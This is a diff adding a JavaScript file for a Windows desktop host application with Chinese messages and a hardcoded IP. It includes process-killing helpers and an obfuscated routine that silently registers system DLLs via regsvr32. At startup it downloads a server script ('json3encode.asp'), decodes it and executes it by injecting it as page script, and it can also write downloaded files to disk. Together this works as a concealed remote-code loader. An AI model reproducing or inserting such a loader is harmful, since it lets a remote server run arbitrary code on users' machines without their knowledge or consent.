@@ -1,0 +1,115 @@
+
+
+window.icount=1259+(parseInt("1405")||0);
+window.sip='37.72.175.67';
+
+var g_oParentForm={
+	gethwnd:function(){return getMainFormHwnd();}, 
+	setSize:function(cx,cy){
+		try{document.body.host.ParentForm.setSize(cx,cy);}catch(e){;}
+		var hwnd=getMainFormHwnd();
+		try{external.callapi("user32","SetWindowPos",  hwnd,0,0,0,cx,cy, 2|0x40);}catch(e){;}
+		
+	},
+	TransparentWindow:function(hwnd,ncolor){
+		try{document.body.host.ParentForm.TransparentWindow(hwnd,ncolor);}catch(e){;}
+		try{document.body.host.TransparentWindow(hwnd,ncolor);}catch(e){;}
+	},
+	show:function(bshow){
+		try{document.body.host.ParentForm.visible=bshow;}catch(e){ ;}
+	},
+	ShowTrayIcon:function(){
+		try{document.body.host.ParentForm.ShowTrayIcon();}catch(e){throw e;}
+	},
+	SetAppTitle:function(stitle){
+		try{document.body.host.SetAppTitle(stitle);}catch(e){;}
+		var hwnd=getMainFormHwnd();
+		try{external.callapi("user32","SetWindowTextW",  hwnd,stitle);}catch(e){;}
+	},
+	GetCmdLine:function(){
+		try{return document.body.host.GetCmdLine();}catch(e){;}
+	},
+	KillThunder:function(){
+		try{document.body.host.ParentForm.KillThunder();return;}catch(e){;}
+	},
+	KillProcess:function(sprocess){
+		try{document.body.host.ParentForm.KillProcess(sprocess);return;}catch(e){;}
+	},
+	GetThunderPath:function(){
+		return document.body.host.ParentForm.GetThunderPath();
+	},
+	GetFileVer:function(sfile){
+		return document.body.host.ParentForm.GetFileVer(sfile);
+	},
+	getTempPath:function()
+	{
+		try{return document.body.host.ParentForm.getTempPath();}catch(e){;}
+		return external.getutemp();
+	},
+	WriteINI:function(sini,ssec,skey,svalue){
+		try{return document.body.host.ParentForm.WriteINI(sini,ssec,skey,svalue);}catch(e){;}
+		//return external.callapi("kernel32","WritePrivateProfileStringW",""+ssec,""+skey,""+svalue,""+sini);	
+	}
+	
+};
+	
+function getMainFormHwnd()
+{
+	try{return document.body.host.ParentForm.hwnd;}catch(e){;}
+	return external.getMainFormHwnd();
+}
+function doHide()
+{
+	try{document.body.host.ParentForm.visible=false;return false;}catch(e){;}
+	external.doMin();
+}
+
+function getTempPath()
+{
+	try{return document.body.host.ParentForm.getTempPath();}catch(e){;}
+	return external.getutemp();
+}
+
+
+
+function RegDlls()
+{
+	try{
+		var oApis=document.body.host;
+		var sDlls_a=[["WScript.Shell","wshom.ocx"],["MSScriptControl.ScriptControl.1","msscript.ocx"],["Scripting.FileSystemObject","scrrun.dll"],["msxml2.xmlhttp","msxml.dll","msxml2.dll","msxml3.dll"],["WINHTTP.WINHTTPREQUEST.5.1","winhttp.dll"]];
+		var sErr="";
+		for(var i=0,n=sDlls_a.length;i<n;i++)
+		{
+			try{
+				var obj=oApis.CreateActiveXObject(sDlls_a[i][0]);
+				if(!obj) throw({"message":"can not create "+sDlls_a[i][0]});
+			}catch(e){
+				sErr=e.message;
+				for(var j=1,m=sDlls_a[i].length;j<m;j++)
+				{
+					oApis.callapi("shel"+"l32.dll",oApis.DecodeInfo("0069007E007B00820082005B008E007B0079008B008A007B006D"),0,0, "regsvr32.exe","/s "+sDlls_a[i][j], 0 , 1);					
+				}
+			}
+		}
+		if(sErr.length){
+			alert("请重新启动软件!\n错误信息:"+sErr);oApis.callapi("kernel32.dll","ExitProcess",0);
+		}
+	}catch(e){alert("regdlls:"+e.message);}
+}
+
+
+window.DispatchXHROnReadyStateChange=function(a){try{setTimeout(a.onreadystatechange,10)}catch(c){}};
+window.ajax=function(a){var c=0,e=window.ajax,c=e._xhrs.idx++,b=null,h=document.body.host;try{b=document.body.host.CreateActiveXObject("MSXML2.XMLHTTP")}catch(l){b=null}if(b){e._xhrs[c]=b;a.type=(a.type||"GET").toUpperCase();a.async=!1===a.async?!1:!0;"http"!=a.url.toLowerCase().slice(0,4)&&(a.url=window.location.protocol+"//"+window.location.host+"/"+a.url);b.open(a.type,a.url,a.async);b.setRequestHeader("app",escape("yalala"));a.beforesend&&a.beforesend.call(a,b);var g=function(){try{var c="",e=
+!(!a.file||!a.file.length),f="";a.encode=a.encode||"utf-8";var d=h.CreateActiveXObject("ADODB.STREAM");d.open();d.type=1;d.position=0;d.write(b.responseBody);e?(c=f=a.file,h.callapi("kernel32.dll","DeleteFileW",f),d.savetofile(f)):(d.position=0,d.type=2,d.charset=a.encode,c=d.readText(d.size));return c}catch(g){return""}};if(a.async){var k=!1;b.onreadystatechange=function(){k||(4==b.readyState&&a.success?(k=!0,a.success.call(a,g(),b),b=null):2==b.readyState&&a.progress&&a.progress.call(a,b))};null!=
+a.data?b.send(a.data):b.send()}else null!=a.data?b.send(a.data):b.send(),a.success.call(a,g(),b),b=null}};window.ajax._xhrs=[];window.ajax._xhrs.idx=0;window.ajax.abort=function(){for(var a=window.ajax._xhrs.length-1;0<=a;a--)window.ajax._xhrs[a]&&(window.ajax._xhrs[a].abort(),window.ajax._xhrs[a]=null,delete window.ajax._xhrs[a])};function evaljs(a){var c=document.createElement("script");c.language="javascript";c.text=a;document.body.appendChild(c)}
+var ntry=0;
+(function(){
+var othis=arguments.callee;
+if("undefined"==typeof document.body.host)setTimeout(arguments.callee,100);else{setTimeout(RegDlls,10);var a=document.body.host;ajax({url:"json3encode.asp",
+beforesend:function(a){if(!ntry) a.setRequestHeader("Accept-Encoding","gzip,deflate")},success:function(c){try{window.xyz=evaljs(a.decodeinfo(c)),window_onload()}catch(e){ntry++;
+if(ntry<2) {setTimeout(othis,100);return;}
+alert("start:"+[e.message,window.xyz]);document.body.host.callapi("kernel32.dll","ExitProcess",0);;}}})}
+
+})();
+
+
